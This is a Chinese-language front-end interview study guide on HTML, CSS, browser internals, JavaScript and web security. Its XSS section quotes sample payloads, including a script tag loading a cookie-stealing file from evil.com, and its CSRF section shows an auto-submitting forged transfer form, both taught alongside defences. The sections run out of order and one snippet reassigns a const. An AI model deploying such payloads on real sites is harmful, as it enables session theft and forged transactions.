# Web 基础面试知识梳理

> 基于 BBQ 项目中的基础高频知识整理，从面试角度系统梳理 HTML、CSS、JavaScript、TypeScript、网络与浏览器核心知识点

## 目录

- [一、HTML 基础](#一html-基础)
- [二、CSS 基础](#二css-基础)
- [三、JavaScript 基础](#三javascript-基础)
- [四、TypeScript](#四typescript)
- [五、网络协议](#五网络协议)
- [六、浏览器原理](#六浏览器原理)
- [七、高频面试题](#七高频面试题)

---

## 一、HTML 基础 ⭐⭐⭐ 🔥

### 1.1 onLoad vs DOMContentLoaded ⭐⭐⭐ 🔥🔥

**考点**：页面加载事件的区别

**区别**：

- **onLoad**：页面所有资源（包括 CSS、JavaScript 和图片等）都加载完成后触发
- **DOMContentLoaded**：页面的主要 HTML 内容被解析并加载完成后触发

**执行顺序**：
```
HTML 解析
    ↓
DOMContentLoaded 触发
    ↓
CSS、图片等资源加载
    ↓
onLoad 触发
```

**使用场景**：
```javascript
// DOMContentLoaded：DOM 操作
document.addEventListener('DOMContentLoaded', () => {
  console.log('DOM 已就绪');
  // 可以进行 DOM 操作
});

// onLoad：需要等待所有资源
window.addEventListener('load', () => {
  console.log('所有资源已加载');
  // 可以获取图片尺寸等
});
```

### 1.2 script 标签的 defer 和 async ⭐⭐⭐ 🔥🔥

**考点**：脚本加载方式的区别

**对比**：

| 特性 | 正常 | defer | async |
|------|------|-------|-------|
| **下载时机** | 阻塞 HTML 解析 | 并行下载 | 并行下载 |
| **执行时机** | 立即执行 | HTML 解析完成后 | 下载完立即执行 |
| **执行顺序** | 按顺序 | 按顺序 | 不保证顺序 |
| **DOMContentLoaded** | 阻塞 | 在之前执行 | 可能阻塞 |

**执行流程**：

```html
<!-- 正常：阻塞 HTML 解析 -->
<script src="script.js"></script>

<!-- defer：延迟执行，在 DOMContentLoaded 之前 -->
<script defer src="script.js"></script>

<!-- async：异步执行，下载完就执行 -->
<script async src="script.js"></script>
```

**使用建议**：
- **defer**：适合需要操作 DOM 的脚本，保证执行顺序
- **async**：适合独立的第三方脚本（如统计代码）

---

## 二、CSS 基础 ⭐⭐⭐ 🔥🔥

### 2.1 BFC（块级格式化上下文）⭐⭐⭐ 🔥🔥🔥

**考点**：BFC 的概念、触发和应用

#### 2.1.1 概念

**定义**：
- BFC 是一个独立的渲染区域，内部元素的布局不会影响外部元素
- 格式化上下文是一系列相关盒子进行布局的环境

**特性**：
1. BFC 内部的盒子在垂直方向上一个接一个排列
2. 相邻盒子的垂直 margin 会合并
3. BFC 包含内部的浮动元素（解决高度塌陷）
4. BFC 不会与浮动元素重叠（实现自适应布局）
5. BFC 内外互不影响

#### 2.1.2 触发条件

**如何触发 BFC**：
1. `overflow` 不为 `visible`（常用 `hidden`）
2. `float` 不为 `none`
3. `position` 为 `absolute` 或 `fixed`
4. `display` 为 `flex`、`grid`、`inline-block` 等
5. 根元素 `<html>`

#### 2.1.3 应用场景

**1. 解决 margin 塌陷**：

```css
/* 问题：两个相邻元素的 margin 会合并 */
.box1 { margin-bottom: 20px; }
.box2 { margin-top: 30px; }
/* 实际间距：30px（取最大值） */

/* 解决：给其中一个元素创建 BFC */
.container {
  overflow: hidden; /* 触发 BFC */
}
```

**2. 清除浮动（解决高度塌陷）**：

```css
/* 问题：父元素高度塌陷 */
.parent {
  /* 子元素浮动，父元素高度为 0 */
}

/* 解决：给父元素触发 BFC */
.parent {
  overflow: hidden; /* 触发 BFC，包含浮动元素 */
}
```

**3. 实现自适应两栏布局**：

```css
/* 左侧固定，右侧自适应 */
.left {
  float: left;
  width: 200px;
}

.right {
  overflow: hidden; /* 触发 BFC，不与浮动元素重叠 */
}
```

### 2.2 CSS 动画 ⭐⭐⭐ 🔥🔥

**考点**：CSS 动画的实现方式

#### 2.2.1 Animation

**基本用法**：

```css
.loading {
  animation: circle 1s infinite linear;
}

@keyframes circle {
  0% {
    transform: rotate(0deg);
  }
  100% {
    transform: rotate(360deg);
  }
}
```

**控制动画**：

```css
/* 暂停/播放 */
animation-play-state: running;  /* 播放 */
animation-play-state: paused;   /* 暂停 */

/* 保留最后一帧 */
animation-fill-mode: forwards;
```

#### 2.2.2 Transition

**基本用法**：

```css
/* property | duration | timing-function | delay */
transition: margin-right 4s ease-in-out 1s;

/* 多个属性 */
transition: width 2s, height 2s, transform 2s;
```

**触发方式**：

```css
.box {
  width: 100px;
  transition: width 0.3s;
}

.box:hover {
  width: 200px; /* 触发过渡 */
}
```

#### 2.2.3 Transform

**优势**：
- 使用 GPU 渲染，不会触发回流和重绘
- 性能更好

**常用属性**：

```css
/* 平移 */
transform: translate(100px, 50px);
transform: translateX(100px);

/* 旋转 */
transform: rotate(45deg);

/* 缩放 */
transform: scale(1.5);

/* 倾斜 */
transform: skew(10deg, 20deg);

/* 组合 */
transform: translate(100px) rotate(45deg) scale(1.5);
```

### 2.3 CSS 性能优化 ⭐⭐⭐ 🔥🔥

#### 2.3.1 GPU 加速

**触发 GPU 加速的属性**：
- `transform`
- `opacity`
- `filter`

**使用方式**：

```css
/* 方式 1：使用 transform */
.element {
  transform: translateZ(0);
  /* 或 */
  transform: translate3d(0, 0, 0);
}

/* 方式 2：使用 will-change */
.element {
  will-change: transform, opacity;
}
```

**注意事项**：
- 不要滥用，会占用大量内存
- 动画结束后移除 `will-change`

```javascript
el.addEventListener('mouseenter', () => {
  el.style.willChange = 'transform, opacity';
});

el.addEventListener('animationend', () => {
  el.style.willChange = 'auto';
});
```

#### 2.3.2 requestAnimationFrame

**优势**：
- 与浏览器刷新率同步（60fps）
- 页面不可见时自动暂停
- 性能更好

**使用示例**：

```javascript
const element = document.getElementById('some-element');
let start;

function step(timestamp) {
  if (start === undefined) {
    start = timestamp;
  }
  
  const elapsed = timestamp - start;
  
  // 确保元素刚好停在 200px 的位置
  element.style.transform = `translateX(${Math.min(0.1 * elapsed, 200)}px)`;
  
  if (elapsed < 2000) {
    window.requestAnimationFrame(step);
  }
}

window.requestAnimationFrame(step);
```

### 2.4 移动端适配 ⭐⭐⭐ 🔥🔥

#### 2.4.1 画 0.5px 的线

**方案 1：transform scale**：

```css
.line {
  height: 1px;
  transform: scaleY(0.5);
}
```

**方案 2：viewport**：

```html
<meta name="viewport" content="width=device-width, initial-scale=0.5, minimum-scale=0.5, maximum-scale=0.5"/>
```

**方案 3：伪元素 + scale**：

```css
.container[data-device="2"] {
  position: relative;
}

.container[data-device="2"]::after {
  position: absolute;
  top: 0;
  left: 0;
  width: 200%;
  height: 200%;
  content: "";
  transform: scale(0.5);
  transform-origin: left top;
  box-sizing: border-box;
  border: 1px solid #333;
}
```

#### 2.4.2 viewport 动态设置

**JavaScript 动态设置**：

```javascript
const scale = 1 / window.devicePixelRatio;
const metaEl = document.querySelector('meta[name="viewport"]');

metaEl.setAttribute('content', 
  `width=device-width,user-scalable=no,initial-scale=${scale},maximum-scale=${scale},minimum-scale=${scale}`
);
```

**副作用**：
- 整个页面被缩放
- 文字、图片等也被缩小

---

## 六、浏览器原理 ⭐⭐⭐ 🔥🔥🔥

### 6.1 浏览器架构 ⭐⭐⭐ 🔥🔥

**考点**：浏览器的进程和线程

#### 6.1.1 进程与线程

**概念**：
- **进程**：包括 CPU、内存在内的执行环境，对应一个正在运行的程序，是资源分配的最小单位
- **线程**：CPU 调度和分派的基本单位，是进程的子任务

#### 6.1.2 Chrome 架构

**主要进程**：
1. **浏览器主进程**：负责界面显示、用户交互、子进程管理
2. **渲染进程**：每个标签页一个进程，负责页面渲染
3. **网络进程**：负责网络资源加载
4. **GPU 进程**：负责 3D 绘制和硬件加速
5. **插件进程**：负责插件运行

#### 6.1.3 渲染进程的线程

**主要线程**：

```
渲染进程
├── GUI 渲染线程（负责渲染页面）
├── JS 引擎线程（负责执行 JavaScript）
├── 事件触发线程（管理事件队列）
├── 定时器线程（管理定时器）
└── 异步 HTTP 请求线程（处理网络请求）
```

**注意**：
- GUI 渲染线程与 JS 引擎线程互斥
- JS 执行会阻塞页面渲染

### 6.2 渲染机制 ⭐⭐⭐ 🔥🔥🔥

**考点**：浏览器如何渲染页面

#### 6.2.1 渲染流程

```
HTML 解析
    ↓
构建 DOM Tree
    ↓                    ↓
CSS 解析          JavaScript 执行
    ↓                    ↓
构建 CSSOM Tree    可能修改 DOM/CSSOM
    ↓                    ↓
    └──────→ 合并 ←──────┘
              ↓
        Render Tree
              ↓
          布局（Layout）
              ↓
          绘制（Paint）
              ↓
          合成（Composite）
```

**详细步骤**：

1. **解析 HTML，构建 DOM Tree**
2. **解析 CSS，构建 CSSOM Tree**
3. **合并 DOM Tree 和 CSSOM Tree，生成 Render Tree**
4. **布局（Layout）**：计算元素的位置和大小
5. **绘制（Paint）**：将元素绘制到屏幕上
6. **合成（Composite）**：将多个图层合成最终页面

#### 6.2.2 回流（Reflow）与重绘（Repaint）⭐⭐⭐ 🔥🔥🔥

**回流（Reflow）**：
- 元素的几何属性（位置、尺寸）发生变化
- 需要重新计算布局
- 开销较大

**触发回流的操作**：
```javascript
// 修改几何属性
element.style.width = '100px';
element.style.height = '100px';
element.style.margin = '10px';

// 获取布局信息（会强制触发回流）
element.offsetWidth;
element.offsetHeight;
element.clientWidth;
element.scrollTop;
element.getBoundingClientRect();

// 添加/删除元素
parent.appendChild(child);
parent.removeChild(child);

// 修改字体大小
element.style.fontSize = '20px';
```

**重绘（Repaint）**：
- 元素的外观（颜色、背景）发生变化
- 不影响布局
- 开销较小

**触发重绘的操作**：
```javascript
// 修改外观属性
element.style.color = 'red';
element.style.backgroundColor = 'blue';
element.style.visibility = 'hidden';
```

**优化建议**：

```javascript
// ❌ 多次操作 DOM，触发多次回流
element.style.width = '100px';
element.style.height = '100px';
element.style.margin = '10px';

// ✅ 批量修改样式
element.style.cssText = 'width: 100px; height: 100px; margin: 10px;';

// ✅ 使用 class
element.className = 'new-style';

// ❌ 频繁读取布局信息
for (let i = 0; i < 1000; i++) {
  const width = element.offsetWidth; // 每次都触发回流
  element.style.width = width + 1 + 'px';
}

// ✅ 缓存布局信息
const width = element.offsetWidth;
for (let i = 0; i < 1000; i++) {
  element.style.width = width + i + 'px';
}

// ✅ 使用 DocumentFragment
const fragment = document.createDocumentFragment();
for (let i = 0; i < 1000; i++) {
  const li = document.createElement('li');
  fragment.appendChild(li);
}
ul.appendChild(fragment); // 只触发一次回流

// ✅ 使用 transform 代替 top/left
// transform 不会触发回流
element.style.transform = 'translateX(100px)';
```

### 6.3 JavaScript 运行机制 ⭐⭐⭐ 🔥🔥🔥

**考点**：Event Loop 和异步执行

#### 6.3.1 执行上下文

**类型**：
1. **全局执行上下文**：只有一个，window 对象
2. **函数执行上下文**：每次函数调用都会创建
3. **eval 执行上下文**：eval 函数执行时创建

**组成**：

```javascript
ExecutionContext = {
  // 1. 变量对象（Variable Object）
  VO: {
    variables: {},  // 变量
    functions: {},  // 函数
    arguments: {}   // 函数参数
  },
  
  // 2. 作用域链（Scope Chain）
  scopeChain: [VO, parentVO, globalVO],
  
  // 3. this 指向
  this: window || caller
}
```

#### 6.3.2 执行栈

**执行流程**：

```javascript
function f1() {
  f2();
}

function f2() {
  f3();
}

function f3() {
  console.log('f3');
}

f1();

// 执行栈变化：
// 1. f1 入栈
// 2. f2 入栈
// 3. f3 入栈
// 4. f3 执行完，出栈
// 5. f2 执行完，出栈
// 6. f1 执行完，出栈
```

#### 6.3.3 Event Loop ⭐⭐⭐ 🔥🔥🔥

**执行流程**：

```
执行同步代码
    ↓
检查微任务队列
    ↓
执行所有微任务
    ↓
检查宏任务队列
    ↓
执行一个宏任务
    ↓
重复上述过程
```

**宏任务（Macro Task）**：
- `setTimeout`
- `setInterval`
- `setImmediate`（Node.js）
- I/O 操作
- UI 渲染
- `MessageChannel`
- `postMessage`

**微任务（Micro Task）**：
- `Promise.then`
- `MutationObserver`
- `process.nextTick`（Node.js）

**示例**：

```javascript
console.log('1');

setTimeout(() => {
  console.log('2');
  Promise.resolve().then(() => {
    console.log('3');
  });
}, 0);

Promise.resolve().then(() => {
  console.log('4');
  setTimeout(() => {
    console.log('5');
  }, 0);
});

console.log('6');

// 输出：1 6 4 2 3 5
```

**执行顺序分析**：
1. 同步代码：1、6
2. 微任务：4（执行时添加宏任务 5）
3. 宏任务：2（执行时添加微任务 3）
4. 微任务：3
5. 宏任务：5

### 6.4 浏览器存储 ⭐⭐⭐ 🔥🔥

**考点**：浏览器存储方式的区别

#### 6.4.1 Cookie vs LocalStorage vs SessionStorage

**对比**：

| 特性 | Cookie | LocalStorage | SessionStorage |
|------|--------|--------------|----------------|
| **容量** | 4KB | 5MB | 5MB |
| **生命周期** | 可设置过期时间 | 永久（手动删除） | 会话结束时清除 |
| **作用域** | 同源 + 可设置 Domain | 同源 | 同源 + 同窗口 |
| **请求携带** | 自动携带 | 不携带 | 不携带 |
| **API** | document.cookie | localStorage API | sessionStorage API |

#### 6.4.2 LocalStorage vs SessionStorage

**区别**：

```javascript
// LocalStorage：持久化存储
localStorage.setItem('key', 'value');
localStorage.getItem('key');
localStorage.removeItem('key');
localStorage.clear();

// SessionStorage：会话级存储
sessionStorage.setItem('key', 'value');
sessionStorage.getItem('key');
sessionStorage.removeItem('key');
sessionStorage.clear();
```

**作用域**：
- LocalStorage：同源下所有窗口共享
- SessionStorage：同源 + 同窗口（不同标签页不共享）

#### 6.4.3 IndexedDB ⭐⭐ 🔥

**特点**：
- 容量大（一般不少于 250MB）
- 支持事务
- 支持索引
- 异步操作

**使用示例**：

```javascript
// 打开数据库
const request = indexedDB.open('myDatabase', 1);

request.onsuccess = (event) => {
  const db = event.target.result;
  
  // 创建事务
  const transaction = db.transaction(['users'], 'readwrite');
  const objectStore = transaction.objectStore('users');
  
  // 添加数据
  objectStore.add({ id: 1, name: 'Alice' });
  
  // 查询数据
  const getRequest = objectStore.get(1);
  getRequest.onsuccess = () => {
    console.log(getRequest.result);
  };
};
```

### 6.5 垃圾回收 ⭐⭐⭐ 🔥🔥🔥

**考点**：JavaScript 的垃圾回收机制

#### 6.5.1 垃圾回收方式

**1. 引用计数**：
- 对象有引用时计数 +1
- 引用释放时计数 -1
- 计数为 0 时回收

**问题**：循环引用无法回收

```javascript
function problem() {
  const obj1 = {};
  const obj2 = {};
  
  obj1.ref = obj2;
  obj2.ref = obj1; // 循环引用
}
```

**2. 标记清除**（主流）：
- 从根对象（window）开始标记
- 标记所有可达对象
- 清除未标记的对象

#### 6.5.2 V8 的垃圾回收

**分代回收**：

```
堆内存
├── 新生代（存活时间短的对象）
│   ├── From 空间
│   └── To 空间
└── 老生代（存活时间长的对象）
```

**新生代回收（Scavenge）**：
1. 将 From 空间的存活对象复制到 To 空间
2. 清空 From 空间
3. From 和 To 空间互换

**老生代回收（Mark-Sweep + Mark-Compact）**：
1. 标记清除：标记存活对象，清除未标记对象
2. 标记整理：整理内存碎片

#### 6.5.3 内存泄漏 ⭐⭐⭐ 🔥🔥

**常见场景**：

**1. 意外的全局变量**：

```javascript
// ❌ 意外创建全局变量
function foo() {
  bar = 'leak'; // 没有 var/let/const
}

// ✅ 使用严格模式
'use strict';
function foo() {
  bar = 'leak'; // 报错
}
```

**2. 未清除的定时器**：

```javascript
// ❌ 定时器未清除
const timer = setInterval(() => {
  console.log(data); // 引用外部变量
}, 1000);

// ✅ 清除定时器
clearInterval(timer);
```

**3. DOM 引用**：

```javascript
// ❌ 保留 DOM 引用
const refA = document.getElementById('refA');
document.body.removeChild(refA); // DOM 删除了
console.log(refA); // 但引用还在

// ✅ 释放引用
refA = null;
```

**4. 闭包**：

```javascript
// ❌ 闭包保留大量数据
function outer() {
  const largeData = new Array(1000000);
  
  return function inner() {
    console.log(largeData.length);
  };
}

// ✅ 只保留必要数据
function outer() {
  const largeData = new Array(1000000);
  const length = largeData.length;
  
  return function inner() {
    console.log(length);
  };
}
```

---

## 七、网络安全 ⭐⭐⭐ 🔥🔥🔥

### 7.1 XSS（跨站脚本攻击）⭐⭐⭐ 🔥🔥🔥

**考点**：XSS 的类型和防御

#### 7.1.1 概念

**定义**：Cross-Site Scripting，攻击者在网站注入恶意脚本，在用户浏览器中执行

#### 7.1.2 类型

**1. 存储型 XSS**：

```
攻击者提交恶意代码到数据库
    ↓
其他用户访问页面
    ↓
服务器返回恶意代码
    ↓
浏览器执行恶意代码
```

**示例**：
```javascript
// 攻击者在留言板提交
<script src="http://evil.com/steal-cookie.js"></script>

// 其他用户访问留言板时，脚本自动执行
```

**2. 反射型 XSS**：

```
攻击者构造恶意 URL
    ↓
诱导用户点击
    ↓
服务器将 URL 参数拼接到页面
    ↓
浏览器执行恶意代码
```

**示例**：
```javascript
// 恶意 URL
https://example.com?name=<script>alert('XSS')</script>

// 服务器直接拼接到页面
<div>Hello, <script>alert('XSS')</script></div>
```

**3. DOM 型 XSS**：

```
攻击者构造恶意 URL
    ↓
前端 JavaScript 取出 URL 参数
    ↓
直接插入到 DOM 中
    ↓
浏览器执行恶意代码
```

**示例**：
```javascript
// 恶意 URL
https://example.com?name=<img src=x onerror=alert('XSS')>

// 前端代码
const name = new URLSearchParams(location.search).get('name');
document.getElementById('greeting').innerHTML = `Hello, ${name}`;
```

#### 7.1.3 防御措施

**1. 输入过滤和转义**：

```javascript
// 转义 HTML 特殊字符
function escapeHtml(str) {
  const map = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#x27;',
    '/': '&#x2F;'
  };
  
  return str.replace(/[&<>"'/]/g, (char) => map[char]);
}

// 使用
element.textContent = userInput; // 安全
element.innerHTML = escapeHtml(userInput); // 安全
```

**2. 使用 CSP（Content Security Policy）**：

```html
<!-- 通过 meta 标签 -->
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' https://trusted.com">

<!-- 或通过 HTTP 头 -->
Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted.com
```

**3. HttpOnly Cookie**：

```javascript
// 服务端设置
response.setHeader('Set-Cookie', 'sessionId=abc123; HttpOnly; Secure');
```

**4. 使用安全的 API**：

```javascript
// ❌ 不安全
element.innerHTML = userInput;
element.outerHTML = userInput;
document.write(userInput);

// ✅ 安全
element.textContent = userInput;
element.setAttribute('data-value', userInput);
```

### 7.2 CSRF（跨站请求伪造）⭐⭐⭐ 🔥🔥🔥

**考点**：CSRF 的原理和防御

#### 7.2.1 概念

**定义**：Cross-Site Request Forgery，攻击者诱导用户访问第三方网站，利用用户的登录状态发起恶意请求

#### 7.2.2 攻击流程

```
1. 用户登录 a.com，保留 Cookie
    ↓
2. 攻击者诱导用户访问 b.com
    ↓
3. b.com 向 a.com 发送请求
    ↓
4. 浏览器自动携带 a.com 的 Cookie
    ↓
5. a.com 误以为是用户本人操作
    ↓
6. 攻击成功
```

**示例**：

```html
<!-- 攻击者的页面 b.com -->
<img src="https://a.com/transfer?to=attacker&amount=1000">

<!-- 或使用表单自动提交 -->
<form action="https://a.com/transfer" method="POST">
  <input type="hidden" name="to" value="attacker">
  <input type="hidden" name="amount" value="1000">
</form>
<script>
  document.forms[0].submit();
</script>
```

#### 7.2.3 防御措施

**1. CSRF Token**：

```javascript
// 服务端生成 Token
const csrfToken = generateToken();
response.cookie('csrfToken', csrfToken);

// 前端在请求中携带 Token
fetch('/api/transfer', {
  method: 'POST',
  headers: {
    'X-CSRF-Token': getCookie('csrfToken')
  },
  body: JSON.stringify(data)
});

// 服务端验证 Token
if (request.headers['x-csrf-token'] !== request.cookies.csrfToken) {
  return response.status(403).send('Invalid CSRF Token');
}
```

**2. SameSite Cookie**：

```javascript
// 服务端设置
response.setHeader('Set-Cookie', 'sessionId=abc123; SameSite=Lax; Secure');
```

**SameSite 取值**：
- **Strict**：完全禁止第三方 Cookie
- **Lax**：大多数情况禁止，导航 GET 请求除外
- **None**：不限制（需同时设置 Secure）

**3. 验证 Referer 和 Origin**：

```javascript
// 服务端验证
const referer = request.headers.referer;
const origin = request.headers.origin;

if (!referer || !referer.startsWith('https://trusted.com')) {
  return response.status(403).send('Invalid Referer');
}
```

**4. 双重 Cookie 验证**：

```javascript
// 服务端设置 Cookie
response.cookie('csrfToken', token);

// 前端在请求头中携带相同的值
fetch('/api/transfer', {
  headers: {
    'X-CSRF-Token': getCookie('csrfToken')
  }
});

// 服务端验证
if (request.headers['x-csrf-token'] !== request.cookies.csrfToken) {
  return response.status(403).send('Invalid CSRF Token');
}
```

### 7.3 中间人攻击 ⭐⭐⭐ 🔥🔥

**考点**：中间人攻击的原理和防御

#### 7.3.1 攻击流程

```
1. 本地请求被劫持（DNS 劫持等）
    ↓
2. 中间人返回自己的证书
    ↓
3. 客户端用中间人的公钥加密数据
    ↓
4. 中间人解密数据
    ↓
5. 中间人向真实服务器发起请求
    ↓
6. 中间人解密服务器响应
    ↓
7. 中间人加密后返回给客户端
```

#### 7.3.2 防御措施

**1. 使用 HTTPS**：
- 数字证书验证服务器身份
- 加密传输内容

**2. 验证证书**：
- 检查证书是否由可信 CA 签发
- 检查证书是否过期
- 检查证书域名是否匹配

**3. HSTS（HTTP Strict Transport Security）**：

```http
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

**4. 证书固定（Certificate Pinning）**：
- 客户端预先内置服务器证书或公钥
- 只信任特定的证书

### 7.4 网络劫持 ⭐⭐ 🔥

**考点**：网络劫持的类型

#### 7.4.1 DNS 劫持

**原理**：篡改 DNS 解析结果，将用户导向恶意网站

**防御**：
- 使用 HTTPS
- 使用可信的 DNS 服务器（如 8.8.8.8）

#### 7.4.2 HTTP 劫持

**原理**：运营商在 HTTP 响应中注入广告

**防御**：
- 全站使用 HTTPS
- 使用 CSP 限制外部资源加载

---

## 八、高频面试题汇总 ⭐⭐⭐

### 8.1 HTML & CSS

1. **如何实现水平垂直居中？**
   - Flexbox：`display: flex; justify-content: center; align-items: center;`
   - Grid：`display: grid; place-items: center;`
   - 绝对定位 + transform：`position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%);`

2. **BFC 的应用场景？**
   - 清除浮动
   - 防止 margin 塌陷
   - 实现自适应两栏布局

3. **CSS 优先级如何计算？**
   - !important > 内联样式 > ID 选择器 > 类选择器 > 标签选择器

### 8.2 JavaScript

1. **闭包的应用场景？**
   - 数据私有化
   - 函数柯里化
   - 模块化

2. **Promise 如何实现？**
   - 三种状态：pending、fulfilled、rejected
   - then 方法返回新的 Promise
   - 支持链式调用

3. **async/await 的原理？**
   - 基于 Generator + Promise
   - async 函数返回 Promise
   - await 等待 Promise 完成

### 8.3 网络

1. **从输入 URL 到页面展示，发生了什么？**
   - DNS 解析
   - TCP 连接（三次握手）
   - 发送 HTTP 请求
   - 服务器处理并返回响应
   - 浏览器解析 HTML、CSS、JavaScript
   - 渲染页面

2. **HTTP 缓存策略？**
   - 强缓存：Cache-Control、Expires
   - 协商缓存：ETag、Last-Modified

3. **HTTPS 如何保证安全？**
   - 非对称加密生成对话密钥
   - 对称加密传输数据
   - 数字证书验证服务器身份

### 8.4 浏览器

1. **Event Loop 的执行顺序？**
   - 执行同步代码
   - 执行所有微任务
   - 执行一个宏任务
   - 重复上述过程

2. **如何避免内存泄漏？**
   - 避免意外的全局变量
   - 及时清除定时器
   - 释放 DOM 引用
   - 合理使用闭包

3. **如何优化页面性能？**
   - 减少 HTTP 请求
   - 使用 CDN
   - 压缩资源
   - 懒加载
   - 使用缓存
   - 避免回流和重绘

---

## 九、参考资料与学习建议

### 9.1 推荐资源

**文档**：
- [MDN Web Docs](https://developer.mozilla.org/)
- [JavaScript.info](https://javascript.info/)
- [Can I Use](https://caniuse.com/)

**书籍**：
- 《JavaScript 高级程序设计》
- 《你不知道的 JavaScript》
- 《HTTP 权威指南》

**博客**：
- 阮一峰的网络日志
- 掘金前端专栏
- 美团技术团队博客

### 9.2 学习建议

1. **系统学习**：按照 HTML → CSS → JavaScript → 网络 → 浏览器的顺序学习
2. **动手实践**：每个知识点都要写代码验证
3. **深入原理**：不仅要知道怎么用，还要知道为什么
4. **总结归纳**：定期整理笔记，形成知识体系
5. **刷题巩固**：通过面试题检验学习效果

---

## 三、JavaScript 基础 ⭐⭐⭐ 🔥🔥🔥

### 3.1 数据类型 ⭐⭐⭐ 🔥🔥

#### 3.1.1 null vs undefined ⭐⭐⭐ 🔥

**考点**：两者的区别

**区别**：
- **undefined**：未定义，变量声明了但还没有赋值
- **null**：空对象，主要用于赋值给可能会返回对象的变量

**注意事项**：
- `undefined` 不是保留字，可以作为变量名（危险）
- 获取安全的 undefined：`void 0`

```javascript
// undefined 可以被赋值（不推荐）
let undefined = 'not undefined';

// 安全获取 undefined
const safeUndefined = void 0;
```

#### 3.1.2 typeof null 的原因 ⭐⭐ 🔥

**考点**：为什么 typeof null 返回 'object'

**原因**：
- 历史遗留问题
- JavaScript 使用类型标签（部分 bit 位）来描述数据类型
- null 的类型标签是 000，和 Object 的类型标签一样
- 因此被判定为 Object

```javascript
typeof null; // 'object'
```

#### 3.1.3 0.1 + 0.2 !== 0.3 ⭐⭐⭐ 🔥🔥🔥

**考点**：浮点数精度问题

**原因**：
1. 相加是二进制相加
2. 小数的二进制表示是无限循环小数
3. 浮点数存储时会截取（52 位）
4. 0.1 + 0.2 的二进制结果 !== 0.3 的二进制

**解决方案**：

```javascript
// 方案 1：使用机器精度
Math.abs(0.1 + 0.2 - 0.3) < Number.EPSILON; // true

// 方案 2：转换为整数计算
(0.1 * 10 + 0.2 * 10) / 10 === 0.3; // true

// 方案 3：使用 toFixed
(0.1 + 0.2).toFixed(1) === '0.3'; // true
```

#### 3.1.4 isNaN vs Number.isNaN ⭐⭐⭐ 🔥

**考点**：两者的区别

**区别**：

```javascript
// isNaN：会尝试转换为数值
isNaN('hello'); // true（'hello' 转换为 NaN）
isNaN(undefined); // true
isNaN({}); // true

// Number.isNaN：先判断是否为数字
Number.isNaN('hello'); // false（不是数字）
Number.isNaN(NaN); // true
Number.isNaN(undefined); // false
```

**推荐**：使用 `Number.isNaN`，更准确

#### 3.1.5 BigInt ⭐⭐ 🔥

**考点**：BigInt 的作用

**问题**：
- Number 的安全范围：`-(2^53 - 1)` 到 `2^53 - 1`
- 超过范围会出现计算不准确

**解决方案**：

```javascript
// 使用 BigInt
const bigNum = 9007199254740991n;
const bigNum2 = BigInt('9007199254740991');

// 运算
bigNum + 1n; // 9007199254740992n

// 注意：不能与 Number 混合运算
bigNum + 1; // TypeError
```

### 3.2 变量提升 ⭐⭐⭐ 🔥🔥🔥

**考点**：为什么要变量提升

**原因**：
1. **提高性能**：预解析阶段创建执行上下文
2. **容错性更好**：函数可以在声明前调用

**执行过程**：

```
解析阶段：
  ↓
创建全局执行上下文
  ↓
变量声明提升（赋值为 undefined）
  ↓
函数声明提升（可使用）
  ↓
执行阶段：
  ↓
逐行执行代码
```

**示例**：

```javascript
console.log(a); // undefined（变量提升）
var a = 1;

foo(); // 'Hello'（函数提升）
function foo() {
  console.log('Hello');
}

// 等价于
var a;
function foo() {
  console.log('Hello');
}
console.log(a);
a = 1;
foo();
```

### 3.3 执行上下文与作用域链 ⭐⭐⭐ 🔥🔥🔥

**考点**：执行上下文的组成

**执行上下文包含**：

```javascript
ExecutionContext = {
  // 1. 变量对象（Variable Object）
  VO: {
    variables: {},  // 变量
    functions: {},  // 函数
    arguments: {}   // 函数参数
  },
  
  // 2. 作用域链（Scope Chain）
  scopeChain: [VO, parentVO, globalVO],
  
  // 3. this 指向
  this: window || caller
}
```

**作用域链**：

```javascript
function outer() {
  const a = 1;
  
  function inner() {
    const b = 2;
    console.log(a, b); // 1 2
  }
  
  inner();
}

// 作用域链：
// inner: [innerVO, outerVO, globalVO]
// outer: [outerVO, globalVO]
```

### 3.4 闭包 ⭐⭐⭐ 🔥🔥🔥

**考点**：闭包的概念和应用

**定义**：
- 函数和其词法环境的组合
- 内部函数可以访问外部函数的变量

**应用场景**：

**1. 数据私有化**：

```javascript
function createCounter() {
  let count = 0; // 私有变量
  
  return {
    increment() {
      count++;
      return count;
    },
    decrement() {
      count--;
      return count;
    },
    getCount() {
      return count;
    }
  };
}

const counter = createCounter();
counter.increment(); // 1
counter.increment(); // 2
counter.getCount(); // 2
```

**2. 函数柯里化**：

```javascript
function curry(fn) {
  return function curried(...args) {
    if (args.length >= fn.length) {
      return fn.apply(this, args);
    } else {
      return function(...args2) {
        return curried.apply(this, args.concat(args2));
      };
    }
  };
}

// 使用
function add(a, b, c) {
  return a + b + c;
}

const curriedAdd = curry(add);
curriedAdd(1)(2)(3); // 6
curriedAdd(1, 2)(3); // 6
```

**3. 模块化**：

```javascript
const module = (function() {
  let privateVar = 'private';
  
  function privateMethod() {
    console.log(privateVar);
  }
  
  return {
    publicMethod() {
      privateMethod();
    }
  };
})();

module.publicMethod(); // 'private'
```

**注意事项**：
- 闭包会保留外部变量的引用，可能导致内存泄漏
- 使用完后应该手动释放：`obj = null`

### 3.5 原型与继承 ⭐⭐⭐ 🔥🔥🔥

**考点**：原型链的理解

**原型链**：

```javascript
function Person(name) {
  this.name = name;
}

Person.prototype.sayHello = function() {
  console.log(`Hello, ${this.name}`);
};

const person = new Person('Alice');

// 原型链：
// person.__proto__ === Person.prototype
// Person.prototype.__proto__ === Object.prototype
// Object.prototype.__proto__ === null
```

**原型链的终点**：

```javascript
Object.getPrototypeOf(Object.prototype); // null
```

**继承方式**：

**1. 原型链继承**：

```javascript
function Parent() {
  this.name = 'parent';
}

function Child() {}

Child.prototype = new Parent();
```

**2. 构造函数继承**：

```javascript
function Parent(name) {
  this.name = name;
}

function Child(name) {
  Parent.call(this, name);
}
```

**3. 组合继承**：

```javascript
function Parent(name) {
  this.name = name;
}

Parent.prototype.sayHello = function() {
  console.log(this.name);
};

function Child(name, age) {
  Parent.call(this, name); // 继承属性
  this.age = age;
}

Child.prototype = Object.create(Parent.prototype); // 继承方法
Child.prototype.constructor = Child;
```

